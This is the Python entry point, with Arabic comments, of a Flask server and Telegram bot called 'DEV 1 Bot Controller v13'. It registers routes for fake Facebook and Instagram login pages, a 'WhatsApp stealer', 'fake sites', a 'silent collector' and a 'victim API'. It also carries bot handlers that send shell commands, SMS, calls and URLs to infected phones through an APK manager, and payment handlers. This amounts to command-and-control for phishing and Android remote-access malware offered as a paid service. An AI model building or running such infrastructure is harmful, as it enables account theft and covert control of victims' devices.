# main.py
# ============================================================
# DEV 1 - Bot Controller v13
# مع Admin System + Silent Collector + Fake Sites + Admin Tools
# + WhatsApp Report Redirect
# ============================================================

import os
import time
import threading
import requests
from flask import Flask, request, jsonify, redirect

from logging_config import (
    get_logger, log_startup_info, log_shutdown_info,
    setup_exception_hook,
)

logger = get_logger("main")
log_startup_info()
setup_exception_hook()

from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET

from imports_manager import (
    wa_bp, apk_bp,
    WA_ENABLED, APK_MANAGER_ENABLED,
    SILENT_ENABLED,
    init_facebook_routes, init_instagram_routes,
    init_whatsapp_stealer_routes, init_apk_routes,
    init_silent_collector_routes,
    register_payment_handlers,
)

from api_victim import init_victim_api

from bot_handlers import (
    start_command, callback_handler,
    dashboard_command, update_command,
    victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
    v_call_step, v_url_step, v_rename_step, victim_name_handler,
    apk_toast_step, apk_shell_step, apk_sendsms_step,
    apk_call_step, apk_url_step,
    upd_target_handler,
    silent_label_handler,
    admin_search_handler, admin_broadcast_handler,
    admin_ban_handler, admin_unban_handler, admin_delete_handler,
    admin_grant_vip_handler, admin_give_stars_handler,
    admin_msg_user_handler,
)

from short_link import init_short_link
from redis_cleaner import start_cleaner

from monitoring import init_monitoring, metrics
from rate_limiter import start_cleanup_thread

# ═══════════════════════════════════════════════════════
# Web Dashboard
# ═══════════════════════════════════════════════════════
try:
    from web_dashboard import init_web_dashboard
    WEB_DASHBOARD_ENABLED = True
    logger.info("[+] web_dashboard imported")
except Exception as e:
    logger.exception(f"[-] web_dashboard import failed: {e}")
    WEB_DASHBOARD_ENABLED = False
    def init_web_dashboard(app): pass

# ═══════════════════════════════════════════════════════
# APK Auto-Update
# ═══════════════════════════════════════════════════════
try:
    from apk_updater import init_apk_update_routes
    APK_UPDATE_ENABLED = True
    logger.info("[+] apk_updater imported")
except Exception as e:
    logger.exception(f"[-] apk_updater import failed: {e}")
    APK_UPDATE_ENABLED = False
    def init_apk_update_routes(app, bot): pass

# ═══════════════════════════════════════════════════════
# Fake Sites
# ═══════════════════════════════════════════════════════
try:
    from fake_sites import init_fake_sites
    FAKE_SITES_ENABLED = True
    logger.info("[+] fake_sites imported")
except Exception as e:
    logger.exception(f"[-] fake_sites import failed: {e}")
    FAKE_SITES_ENABLED = False
    def init_fake_sites(app, bot): pass

# ═══════════════════════════════════════════════════════
# Admin System Hook
# ═══════════════════════════════════════════════════════
try:
    from admin_system_hook import init_admin_system
    ADMIN_SYSTEM_HOOK_ENABLED = True
    logger.info("[+] admin_system_hook imported")
except Exception as e:
    logger.exception(f"[-] admin_system_hook import failed: {e}")
    ADMIN_SYSTEM_HOOK_ENABLED = False
    def init_admin_system(bot): return False

# ═══════════════════════════════════════════════════════
# ★★★ Admin Tools ★★★
# ═══════════════════════════════════════════════════════
try:
    from admin_tools import init_admin_tools
    ADMIN_TOOLS_ENABLED = True
    logger.info("[+] admin_tools imported")
except Exception as e:
    logger.exception(f"[-] admin_tools import failed: {e}")
    ADMIN_TOOLS_ENABLED = False
    def init_admin_tools(app, bot): pass


# ═══════════════════════════════════════════════════════
# Flask Setup
# ═══════════════════════════════════════════════════════
app = Flask(__name__)

# ============================================================
# ★★★ WhatsApp Report Redirect v2 — يفتح التطبيقات على الموبايل ★★★
# ============================================================
@app.route('/wa/redirect/<payload_id>')
def wa_redirect(payload_id):
    """مُوجّه ذكي — يفتح التطبيق على الموبايل أو الموقع على الكمبيوتر"""
    import urllib.parse
    from flask import Response
    from whatsapp_report_generator import get_report_payload

    payload = get_report_payload(payload_id)
    if not payload:
        return "❌ الرابط منتهي أو غير صالح", 410

    link_type = request.args.get('type', 'gmail')
    to = payload['to']
    subject = payload['subject']
    body = payload['body']

    # ═══ بناء الروابط لكل تطبيق ═══
    # Gmail — Deep Link + Web Fallback
    gmail_app = f"googlegmail://co?to={urllib.parse.quote(to)}&subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"
    gmail_web = f"https://mail.google.com/mail/?view=cm&fs=1&to={urllib.parse.quote(to)}&su={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"

    # Outlook — Deep Link + Web Fallback
    outlook_app = f"ms-outlook://compose?to={urllib.parse.quote(to)}&subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"
    outlook_web = f"https://outlook.live.com/mail/0/deeplink/compose?to={urllib.parse.quote(to)}&subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"

    # Yahoo — Deep Link + Web Fallback
    yahoo_app = f"ymail://mail/compose?to={urllib.parse.quote(to)}&subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"
    yahoo_web = f"https://compose.mail.yahoo.com/?to={urllib.parse.quote(to)}&sub={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"

    # Mailto — للافتراضي
    mailto = f"mailto:{to}?subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"

    # اختر الروابط حسب النوع
    if link_type == 'gmail':
        app_url = gmail_app
        web_url = gmail_web
        app_name = "Gmail"
        app_icon = "📮"
    elif link_type == 'outlook':
        app_url = outlook_app
        web_url = outlook_web
        app_name = "Outlook"
        app_icon = "📧"
    elif link_type == 'yahoo':
        app_url = yahoo_app
        web_url = yahoo_web
        app_name = "Yahoo Mail"
        app_icon = "📨"
    else:
        app_url = mailto
        web_url = mailto
        app_name = "الإيميل"
        app_icon = "✉️"

    # ═══ صفحة HTML بتحوّل تلقائي ═══
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري فتح {app_name}...</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #0f172a;
            color: #e2e8f0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .container {{
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 20px;
            padding: 40px 28px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }}
        .icon {{
            font-size: 72px;
            margin-bottom: 20px;
            animation: pulse 1.5s ease-in-out infinite;
        }}
        @keyframes pulse {{
            0%, 100% {{ transform: scale(1); opacity: 1; }}
            50% {{ transform: scale(1.1); opacity: 0.8; }}
        }}
        h1 {{
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #f1f5f9;
        }}
        p {{
            font-size: 14px;
            color: #94a3b8;
            line-height: 1.7;
            margin-bottom: 24px;
        }}
        .spinner {{
            width: 40px;
            height: 40px;
            border: 3px solid #334155;
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        .btn {{
            display: block;
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3b82f6, #06b6d4);
            color: #fff;
            text-decoration: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 12px;
            transition: transform 0.2s;
            border: none;
            cursor: pointer;
            font-family: inherit;
        }}
        .btn:hover {{ transform: translateY(-2px); }}
        .btn-secondary {{
            background: #334155;
            color: #e2e8f0;
        }}
        .info {{
            font-size: 12px;
            color: #64748b;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #334155;
            line-height: 1.6;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">{app_icon}</div>
        <div class="spinner"></div>
        <h1>جاري فتح {app_name}...</h1>
        <p>لو التطبيق ما فتحش تلقائياً، اضغط الزر تحت</p>

        <a href="{app_url}" class="btn" id="appBtn">
            {app_icon} فتح تطبيق {app_name}
        </a>
        <a href="{web_url}" class="btn btn-secondary">
            🌐 فتح الموقع بدلاً من التطبيق
        </a>

        <div class="info">
            💡 <b>ملاحظة:</b><br>
            لو الرسالة ما ظهرتش في التطبيق، انسخها من الموقع
        </div>
    </div>

    <script>
        (function() {{
            var appUrl = "{app_url}";
            var webUrl = "{web_url}";

            // محاولة فتح التطبيق تلقائياً
            function tryOpenApp() {{
                try {{
                    window.location.href = appUrl;
                }} catch(e) {{
                    console.log("App open failed:", e);
                }}
            }}

            // لو فشل التطبيق بعد 1.5 ثانية → افتح الموقع
            var fallbackTimer = setTimeout(function() {{
                // لو لسه في نفس الصفحة (يعني التطبيق ما فتحش)
                if (!document.hidden) {{
                    window.location.href = webUrl;
                }}
            }}, 1500);

            // لو الصفحة اتخفت (التطبيق فتح)
            document.addEventListener('visibilitychange', function() {{
                if (document.hidden) {{
                    clearTimeout(fallbackTimer);
                }}
            }});

            // افتح التطبيق بعد ما الصفحة تحمّل
            setTimeout(tryOpenApp, 100);
        }})();
    </script>
</body>
</html>"""

    return Response(html, mimetype='text/html')


# ═══════════════════════════════════════════════════════
# Origin Gate
# ═══════════════════════════════════════════════════════
ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']

ALLOWED_PREFIXES = (
    '/wa', '/apk', '/dashboard', '/s/', '/fs',
    '/login.php', '/home.php', '/fb', '/ig_login.php',
    '/fb_capture', '/api/v1/session', '/f/',
    '/profile', '/admin/wb',
    '/manifest.json', '/sw.js', '/favicon.ico', '/robots.txt',
    '/_health', '/_metrics', '/_version',
)


@app.before_request
def verify_origin():
    path = request.path
    if path in ORIGIN_GATE_EXEMPT:
        return None
    if request.method == 'OPTIONS':
        return None
    if path.startswith('/apk/') or path.startswith('/victim/'):
        return None
    if any(path.startswith(p) for p in ALLOWED_PREFIXES):
        return None
    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None
    client_ip = (
        request.headers.get('CF-Connecting-IP') or
        request.headers.get('X-Forwarded-For') or
        request.remote_addr
    )
    logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
    metrics.inc_counter("blocked_requests", tags={"path": path})
    return jsonify({"error": "تم رفض الوصول"}), 403


@app.route('/')
def health_check():
    return "DEV 1 Controller is running.", 200


@app.before_request
def start_timer():
    request._start_time = time.time()


@app.after_request
def log_request(response):
    try:
        if hasattr(request, '_start_time'):
            elapsed_ms = (time.time() - request._start_time) * 1000
            if not request.path.startswith(('/_', '/')):
                logger.debug(
                    f"🌐 {request.method} {request.path} → "
                    f"{response.status_code} ({elapsed_ms:.1f}ms)"
                )
                metrics.observe_timing(
                    "http_request_ms", elapsed_ms,
                    tags={"method": request.method, "path": request.path}
                )
    except Exception:
        pass
    return response


# ═══════════════════════════════════════════════════════
# Blueprints
# ═══════════════════════════════════════════════════════
if wa_bp:
    app.register_blueprint(wa_bp)
    logger.info("[+] Registered: wa_bp")

if apk_bp:
    app.register_blueprint(apk_bp)
    logger.info("[+] Registered: apk_bp")


# ═══════════════════════════════════════════════════════
# Init Routes
# ═══════════════════════════════════════════════════════
init_facebook_routes(app, bot)
logger.info("[+] Init: facebook routes")

init_instagram_routes(app, bot)
logger.info("[+] Init: instagram routes")

if WA_ENABLED:
    try:
        init_whatsapp_stealer_routes(app, bot)
        logger.info("[+] Init: wa_stealer routes")
    except Exception as e:
        logger.exception(f"[-] WA Stealer init failed: {e}")

if APK_MANAGER_ENABLED:
    try:
        init_apk_routes(app, bot)
        logger.info("[+] Init: apk_manager routes")
    except Exception as e:
        logger.exception(f"[-] APK Manager init failed: {e}")

if APK_UPDATE_ENABLED:
    try:
        init_apk_update_routes(app, bot)
        logger.info("[+] Init: apk update routes")
    except Exception as e:
        logger.exception(f"[-] APK Update init failed: {e}")

if SILENT_ENABLED:
    try:
        init_silent_collector_routes(app, bot)
        logger.info("[+] Init: silent collector routes")
    except Exception as e:
        logger.exception(f"[-] Silent Collector init failed: {e}")

if FAKE_SITES_ENABLED:
    try:
        init_fake_sites(app, bot)
        logger.info("[+] Init: fake sites routes")
    except Exception as e:
        logger.exception(f"[-] Fake Sites init failed: {e}")

register_payment_handlers(bot)
logger.info("[+] Init: payment handlers")

try:
    init_victim_api(app, bot)
    logger.info("[+] Init: victim API")
except Exception as e:
    logger.exception(f"[-] Victim API init failed: {e}")

try:
    init_short_link(app)
    logger.info("[+] Init: short_link")
except Exception as e:
    logger.exception(f"[-] Short link init failed: {e}")

init_monitoring(app)
start_cleanup_thread()

if WEB_DASHBOARD_ENABLED:
    try:
        init_web_dashboard(app)
        logger.info("[+] Init: web dashboard")
    except Exception as e:
        logger.exception(f"[-] Web Dashboard init failed: {e}")

if ADMIN_SYSTEM_HOOK_ENABLED:
    try:
        success = init_admin_system(bot)
        if success:
            logger.info("[+] Init: admin system hook")
    except Exception as e:
        logger.exception(f"[-] Admin System Hook init failed: {e}")

# ═══════════════════════════════════════════════════════
# ★★★ Init Admin Tools ★★★
# ═══════════════════════════════════════════════════════
if ADMIN_TOOLS_ENABLED:
    try:
        init_admin_tools(app, bot)
        logger.info("[+] Init: admin tools")
    except Exception as e:
        logger.exception(f"[-] Admin Tools init failed: {e}")
else:
    logger.warning("[-] Admin Tools disabled")


# ═══════════════════════════════════════════════════════
# Telegram Bot
# ═══════════════════════════════════════════════════════
def run_telegram_bot():
    logger.info("=" * 60)
    logger.info("🤖 Starting Telegram Bot polling...")
    logger.info("=" * 60)

    try:
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"}, timeout=15,
        )
    except Exception as e:
        logger.error(f"[-] deleteWebhook: {e}")

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
        logger.info(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        logger.error(f"[-] getMe: {e}")

    attempt = 0
    while True:
        try:
            attempt += 1
            logger.info(f"[+] Polling attempt #{attempt}")
            metrics.inc_counter("bot_polling_attempts")
            bot.infinity_polling(
                skip_pending=True, timeout=30,
                long_polling_timeout=30, none_stop=True,
            )
        except Exception as e:
            logger.exception(f"[-] Polling crashed: {e}")
            metrics.inc_counter("bot_polling_crashes")
            time.sleep(5)


if __name__ == "__main__":
    try:
        start_cleaner()
        logger.info("[+] Redis cleaner started")

        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
        bot_thread.start()
        logger.info("[+] Bot thread started")

        time.sleep(2)

        port = int(os.environ.get("PORT", 8080))
        logger.info(f"🌐 Flask Web Server starting on port {port}...")

        app.run(host="0.0.0.0", port=port, debug=False,
                use_reloader=False, threaded=True)

    except KeyboardInterrupt:
        logger.info("🛑 Received KeyboardInterrupt")
    except Exception as e:
        logger.exception(f"💥 Fatal error: {e}")
    finally:
        log_shutdown_info()
